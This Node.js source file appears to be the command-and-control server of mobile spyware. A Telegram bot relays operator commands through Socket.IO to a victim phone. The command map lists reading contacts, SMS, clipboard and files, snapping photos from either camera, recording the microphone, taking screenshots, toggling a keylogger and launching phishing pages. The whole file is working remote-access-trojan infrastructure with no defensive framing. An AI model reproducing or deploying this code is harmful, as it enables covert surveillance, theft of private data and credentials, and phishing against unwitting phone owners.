// index.js - Telegram Bot + Socket.IO Server

const fs = require('fs');
const path = require('path');
const http = require('http');
const express = require('express');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');

// --- CONFIGURATION ---
const CONFIG_FILE = path.join(__dirname, 'data.json');
let TOKEN = '';

try {
    const data = fs.readFileSync(CONFIG_FILE, 'utf8');
    const config = JSON.parse(data);
    if (!config.telegram_token) throw new Error("telegram_token missing");
    TOKEN = config.telegram_token;
    console.log("[CONFIG] Token loaded successfully.");
} catch (err) {
    console.error("[CRITICAL] Failed to load data.json:", err.message);
    process.exit(1);
}

// --- COMMAND MAP ---
const COMMAND_MAP = {
    contacts: { instruction: "CMD:CONTACTS_READ", type: "simple" },
    sms: { instruction: "CMD:SMS_READ", type: "simple" },
    file_explorer: { instruction: "CMD:FILE_EXPLORER_ROOT", type: "simple" },
    clipboard: { instruction: "CMD:CLIPBOARD_READ", type: "simple" },
    apps: { instruction: "CMD:APPS_LIST", type: "simple" },
    main_camera: { instruction: "CMD:CAMERA_MAIN_SNAP", type: "simple" },
    selfie_camera: { instruction: "CMD:CAMERA_SELFIE_SNAP", type: "simple" },
    microphone: { instruction: "CMD:MIC_RECORD_SHORT", type: "simple" },
    screenshot: { instruction: "CMD:SCREEN_CAPTURE", type: "simple" },
    vibrate: { instruction: "CMD:VIBRATE_SHORT", type: "simple" },
    play_audio: { instruction: "CMD:AUDIO_PLAY_DEFAULT", type: "simple" },
    keylogger_on: { instruction: "CMD:KEYLOGGER_START", type: "simple" },
    keylogger_off: { instruction: "CMD:KEYLOGGER_STOP", type: "simple" },
    phishing: { instruction_prefix: "CMD:PHISHING_INIT|", type: "arg" },
    open_url: { instruction_prefix: "CMD:URL_OPEN|", type: "arg" }
};

// --- EXPRESS + SOCKET.IO ---
const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 3000;
const io = new Server(server, { cors: { origin: "*" } });

let connectedClients = {};

io.on('connection', (socket) => {
    console.log("Client connected:", socket.id);
    
    socket.on('register', (data) => {
        if (!data.clientId) return;
        connectedClients[data.clientId] = socket;
        console.log("Registered client:", data.clientId);
    });
    
    socket.on('response', (data) => {
        console.log(`[RESPONSE] ${data.clientId}:`, data);
    });
    
    socket.on('disconnect', () => {
        for (const id in connectedClients) {
            if (connectedClients[id] === socket) {
                delete connectedClients[id];
                console.log("Client disconnected:", id);
            }
        }
    });
});

server.listen(PORT, () => console.log(`Socket Server listening on port ${PORT}`));

// --- TELEGRAM BOT ---
const bot = new TelegramBot(TOKEN, {
    polling: {
        interval: 1000,
        autoStart: true,
        params: { timeout: 10 }
    }
});
console.log("Telegram Bot Initialized.");

// --- HELPER FUNCTIONS ---
function sendCommandToClient(clientId, command, argument) {
    const socket = connectedClients[clientId];
    if (!socket) return `[ERROR] Client ${clientId} not connected`;
    
    const payload = argument ? `${command}|${argument}` : command;
    socket.emit('command', { command, argument });
    return `[DISPATCH] Sent to ${clientId}: ${payload}`;
}

function handleTelegramCommand(commandKey, msg, argument) {
    const commandData = COMMAND_MAP[commandKey];
    if (!commandData) return bot.sendMessage(msg.chat.id, "Command not recognized.");
    
    const clientId = "phone_1"; // مثال ثابت، يمكن تغييره حسب النظام
    let result;
    
    if (commandData.type === "simple") {
        result = sendCommandToClient(clientId, commandData.instruction);
    } else if (commandData.type === "arg") {
        const arg = argument || "N/A";
        result = sendCommandToClient(clientId, commandData.instruction_prefix + arg);
    }
    
    bot.sendMessage(msg.chat.id, result);
}

// --- TELEGRAM COMMAND LISTENERS ---
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const commands = Object.keys(COMMAND_MAP).map(k => `/${k}`).join(', ');
    bot.sendMessage(chatId, `Remote Control Initialized.\nAvailable Commands: ${commands}\nUse /open_url [url] or /phishing [url] for arguments.`);
});

// Simple commands
const simpleKeys = Object.keys(COMMAND_MAP).filter(k => COMMAND_MAP[k].type === "simple");
if (simpleKeys.length > 0) {
    const simpleRegex = new RegExp(`^/(${simpleKeys.join('|')})$`);
    bot.onText(simpleRegex, (msg, match) => handleTelegramCommand(match[1], msg));
}

// Commands with arguments
const argKeys = Object.keys(COMMAND_MAP).filter(k => COMMAND_MAP[k].type === "arg");
if (argKeys.length > 0) {
    const argRegex = new RegExp(`^/(${argKeys.join('|')})\\s+(.+)`);
    bot.onText(argRegex, (msg, match) => handleTelegramCommand(match[1], msg, match[2]));
}

// Unknown messages
bot.on('message', (msg) => {
    if (msg.text && !msg.text.startsWith('/')) bot.sendMessage(msg.chat.id, "Command not recognized. Type /start to see commands.");
});
